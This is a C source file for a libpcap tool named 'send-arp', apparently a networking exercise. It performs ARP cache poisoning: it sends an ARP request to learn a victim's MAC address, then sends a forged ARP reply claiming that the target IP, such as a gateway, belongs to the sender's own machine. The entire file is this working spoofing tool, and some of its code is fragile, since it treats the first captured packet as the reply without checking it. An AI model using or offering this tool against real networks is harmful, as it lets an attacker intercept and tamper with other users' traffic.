#include <stdio.h>
#include <pcap.h>
#include <arpa/inet.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

#define INIT_SIZE 8

typedef struct {
    uint8_t oct[6];
} mac_addr;

// arp packet
typedef struct {
    mac_addr dest;
    mac_addr src;
    ushort type;
    ushort hardwareType;
    ushort protocolType;
    ushort hardware_protocolSize;
    ushort opcode;
    mac_addr senderMac;
    unsigned char senderIp[4];
    mac_addr targetMac;
    unsigned char targetIp[4];
} arp_packet;

char* str(int size) {
	char* string = (char*)malloc(sizeof(char) * size);

	for (int i = 0; i < size; i++)
		string[i] = '\0';

	return string;
}

char** split(char *sentence, char separator) {
	char** tokens;
	int* lengths;
	int tokens_idx = 0;
	int token_idx = 0;
	int num_tokens = 1;

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator)
			(num_tokens)++;
	}

	lengths = (int*)malloc(sizeof(int) * (num_tokens));
	tokens = (char**)malloc(sizeof(char*) * (num_tokens));

	for (int i = 0; i < num_tokens; i++) {
		tokens[i] = str(INIT_SIZE);
		lengths[i] = INIT_SIZE;
	}

	for (int i = 0; i < strlen(sentence); i++) {
		if (sentence[i] == separator && strlen(tokens[tokens_idx]) != 0) {
			token_idx = 0;
			tokens_idx++;
		}
		else if (sentence[i] == separator && strlen(tokens[tokens_idx]) == 0){
			continue;
		}
		else {
			/* Memory reallocation, If  array is full. */

			if (strlen(tokens[tokens_idx]) == lengths[tokens_idx] - 1) {
				tokens[tokens_idx] = realloc(tokens[tokens_idx], (lengths[tokens_idx] * sizeof(char)) << 1);

				for (int j = lengths[tokens_idx]; j < lengths[tokens_idx] << 1; j++)
					tokens[tokens_idx][j] = '\0';

				lengths[tokens_idx] <<= 1;
			}

			tokens[tokens_idx][token_idx] = sentence[i];
			token_idx++;
		}
	}

	return tokens;
}


void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void get_my_mac_address(char* interface, mac_addr* packet) {
    char path[100];
    char my_mac_address[20];
    char** my_mac_address_bytes;
    sprintf(path, "/sys/class/net/%s/address", interface);
    FILE* fp = fopen(path, "r");
    if (fp == NULL) {
        printf("failed to open %s\n", path);
        return;
    }
    fscanf(fp, "%s", my_mac_address);
    my_mac_address_bytes = split(my_mac_address, ':');
    for(int i = 0; i < 6; i++) packet->oct[i] = (uint8_t)strtol(my_mac_address_bytes[i], NULL, 16);
    fclose(fp);
}

void get_my_ip_address(char* interface, arp_packet* packet) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);

    ifr.ifr_addr.sa_family = AF_INET;

    strncpy(ifr.ifr_name, interface, IFNAMSIZ-1);

    ioctl(fd, SIOCGIFADDR, &ifr);

    close(fd);
    char** tmp = split(inet_ntoa(((struct sockaddr_in *)&ifr.ifr_addr)->sin_addr), '.');
        packet->senderIp[0] = atoi(tmp[0]);
        packet->senderIp[1] = atoi(tmp[1]);
        packet->senderIp[2] = atoi(tmp[2]);
        packet->senderIp[3] = atoi(tmp[3]);
}

// get my ip address

// get target mac address with arp request


int main(int argc, char* argv[]) {
    if (argc == 2 || argc % 2) {
		usage();
		return -1;
	}

    arp_packet packet;
    for(int i = 2; i < argc - 1; i+=2) {
        char** tmp;
        for(int i = 0; i < 6; i++) packet.dest.oct[i] = 0xff;
        get_my_mac_address(argv[1], &packet.src);
        packet.type = htons(0x0806);
        packet.hardwareType = htons(0x0001);
        packet.protocolType = htons(0x0800);
        packet.hardware_protocolSize = htons(0x0604);
        packet.opcode = htons(0x0001);
        get_my_mac_address(argv[1], &packet.senderMac);
        get_my_ip_address(argv[1], &packet);
        for(int i = 0; i < 6; i++) packet.targetMac.oct[i] = 0x00;
        tmp = split(argv[i], '.');
        packet.targetIp[0] = atoi(tmp[0]);
        packet.targetIp[1] = atoi(tmp[1]);
        packet.targetIp[2] = atoi(tmp[2]);
        packet.targetIp[3] = atoi(tmp[3]);
        pcap_t* handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, NULL);
        if (handle == NULL) {
            printf("failed to open %s\n", argv[1]);
            return -1;
        }
        
        struct pcap_pkthdr* header;
        const u_char* res;
        pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));
        pcap_next_ex(handle, &header, &res);
        res += 6;

        packet.opcode = htons(0x0002);
        for(int i = 0; i < 6; i++) {
            packet.dest.oct[i] = res[i];
            packet.targetMac.oct[i] = res[i];
        }
        tmp = split(argv[i + 1], '.');
        packet.senderIp[0] = atoi(tmp[0]);
        packet.senderIp[1] = atoi(tmp[1]);
        packet.senderIp[2] = atoi(tmp[2]);
        packet.senderIp[3] = atoi(tmp[3]);
        pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));
        
        pcap_close(handle);
    }
    return 0;
}